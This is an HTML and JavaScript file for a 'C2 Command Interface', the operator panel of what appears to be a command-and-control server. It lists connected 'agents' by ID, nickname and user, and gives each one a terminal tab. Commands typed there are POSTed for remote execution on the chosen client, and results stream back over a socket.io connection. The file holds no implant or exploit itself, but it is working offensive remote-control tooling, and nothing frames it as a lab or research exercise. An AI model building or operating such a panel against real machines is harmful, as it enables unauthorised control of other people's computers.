<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Command Interface</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: white;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            height: 68vh;
        }

        .tabs-container {
            display: flex;
            gap: 5px;
            padding: 5px;
            background: #333;
            flex-shrink: 0;
        }

        .tab {
            padding: 5px 15px;
            background: #444;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 3px 3px 0 0;
            transition: background 0.3s;
        }

        .tab.active {
            background: #666;
        }

        .clients-container {
            flex: 1;
            position: relative;
            min-height: 0;
            overflow: hidden;
        }

        .client-section {
            display: none;
            flex-direction: column;
            height: 100%;
            position: absolute;
            width: 100%;
            top: 0;
            bottom: 0;
        }

        .client-section.active {
            display: flex;
        }

        .terminal {
            flex: 1;
            padding: 10px;
            overflow-y: auto;
            white-space: pre-wrap;
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            min-height: 0;
        }

        .input-area {
            border-top: 1px solid #555;
            padding: 10px;
            display: flex;
            gap: 10px;
            background: #222;
            flex-shrink: 0;
        }

        .input-area .prompt {
            color: #0f0;
            white-space: nowrap;
            font-family: monospace;
            padding-top: 4px;
        }

        .input-area input {
            flex: 1;
            background: #111;
            border: 1px solid #333;
            color: #0f0;
            padding: 5px 10px;
            font-family: monospace;
        }

        .input-area button {
            background: #444;
            color: white;
            border: none;
            padding: 5px 15px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .input-area button:hover {
            background: #555;
        }

        .notification-bar {
            position: fixed;
            top: 0;
            right: -100%;
            background-color: #333;
            color: white;
            padding: 10px;
            font-family: Arial, sans-serif;
            transition: right 0.5s ease;
            display: none;
            z-index: 1000;
            border-radius: 3px 0 0 3px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="tabs-container" id="tabs-container"></div>
        <div class="clients-container" id="clients-container">
            <div class="no-clients"
                style="display: flex; justify-content: center; align-items: center; height: 100%; color: #666;">
                No active agents connected
            </div>
        </div>
    </div>

    <div class="notification-bar" id="notification-bar"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket2 = io('https://localhost:5000', {
            transports: ['websocket'], // Force WebSocket transport (optional)
            secure: true // Ensure secure connection
        });
        let activeClientId = null;
        const allClients = new Map();

        // WebSocket event handlers
        socket2.on('live_client_list', (data) => {
            if (data.type === 'full_update') {
                updateClientList(data.clients);
            }
        });

        function updateClientList(clients) {
            const newClientIds = new Set(clients.map(c => c.client_id));
            const existingClientIds = new Set(allClients.keys());

            existingClientIds.forEach(id => {
                if (!newClientIds.has(id)) removeClient(id);
            });

            clients.forEach(client => {
                if (!allClients.has(client.client_id)) addClient(client);
            });

            document.querySelector('.no-clients').style.display =
                allClients.size > 0 ? 'none' : 'flex';
        }

        function addClient(client) {
            allClients.set(client.client_id, client);

            // Create tab
            const tab = document.createElement('button');
            tab.className = 'tab';
            tab.textContent = `${client.client_id}-${client.nickname}`;
            tab.dataset.clientId = client.client_id;
            tab.onclick = () => switchTab(client.client_id);
            document.getElementById('tabs-container').appendChild(tab);

            // Create client section
            const section = document.createElement('div');
            section.className = 'client-section';
            section.id = `client-${client.client_id}`;

            const terminal = document.createElement('div');
            terminal.className = 'terminal';
            terminal.dataset.clientId = client.client_id;

            const inputArea = document.createElement('div');
            inputArea.className = 'input-area';

            const prompt = document.createElement('span');
            prompt.className = 'prompt';
            prompt.textContent = `${client.user} > `;

            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = 'Type command here';
            input.addEventListener('keypress', e => {
                if (e.key === 'Enter') sendCommand(client.client_id, input);
            });

            const button = document.createElement('button');
            button.textContent = 'Send';
            button.onclick = () => sendCommand(client.client_id, input);

            inputArea.appendChild(prompt);
            inputArea.appendChild(input);
            inputArea.appendChild(button);

            section.appendChild(terminal);
            section.appendChild(inputArea);
            document.getElementById('clients-container').appendChild(section);

            if (allClients.size === 1) switchTab(client.client_id);
            showNotification(`Client added: ${client.client_id} - ${client.nickname}`, true);
        }

        function removeClient(clientId) {
            const client = allClients.get(clientId);
            showNotification(`Client removed: ${clientId} - ${client.nickname}`);

            document.querySelectorAll(`[data-client-id="${clientId}"]`).forEach(el => el.remove());
            allClients.delete(clientId);

            if (activeClientId === clientId) {
                const firstClient = allClients.keys().next().value;
                firstClient ? switchTab(firstClient) : activeClientId = null;
            }
        }

        function switchTab(clientId) {
            document.querySelectorAll('.tab').forEach(tab =>
                tab.classList.toggle('active', tab.dataset.clientId === clientId));
            document.querySelectorAll('.client-section').forEach(section =>
                section.classList.toggle('active', section.id === `client-${clientId}`));
            activeClientId = clientId;
        }

        function sendCommand(clientId, inputElement) {
            const command = inputElement.value.trim();
            if (!command) return;

            const terminal = document.querySelector(`.terminal[data-client-id="${clientId}"]`);
            terminal.textContent += `${allClients.get(clientId).user} > ${command}\n`;
            terminal.scrollTop = terminal.scrollHeight;

            fetch('/input-command-to-execute-from-web', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientid: clientId, command })
            })
    .then(response => response.json())
    .then(data => {
        if (data.status) {
            alert(data.status);
        }
    })
    .catch(error => {
        alert("Failed to send the command. Please try again.");
        console.error('Error:', error);
    });
    inputElement.value = '';
}

           
        

        function showNotification(message, isConnected) {
            const notificationBar = document.getElementById('notification-bar');
            notificationBar.style.backgroundColor = isConnected ? 'green' : 'red';
            notificationBar.textContent = message;
            notificationBar.style.display = 'block';
            notificationBar.style.right = '0';

            setTimeout(() => {
                notificationBar.style.right = '-100%';
                setTimeout(() => notificationBar.style.display = 'none', 500);
            }, 3000);
        }

        socket2.on('command_result', (data) => {
            const terminal = document.querySelector(`.terminal[data-client-id="${data.client_id}"]`);
            if (terminal) {
                terminal.textContent += `\n${data.result}\n`;
                terminal.scrollTop = terminal.scrollHeight;
            }
        });

    </script>
</body>

</html>
